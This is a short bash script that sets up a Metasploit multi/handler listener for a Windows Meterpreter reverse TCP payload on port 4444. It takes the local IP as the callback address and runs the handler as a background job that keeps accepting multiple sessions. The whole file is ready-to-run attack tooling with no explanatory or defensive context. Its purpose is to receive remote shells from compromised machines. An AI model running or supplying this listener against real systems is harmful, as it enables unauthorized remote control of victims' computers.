#!/bin/bash

# Set up the listener in Metasploit
msfconsole -q -x \
"use exploit/multi/handler; \
set PAYLOAD windows/meterpreter/reverse_tcp; \
set LHOST $(hostname -I | cut -d' ' -f1); \
set LPORT 4444; \
set ExitOnSession false; \
exploit -j -z;"
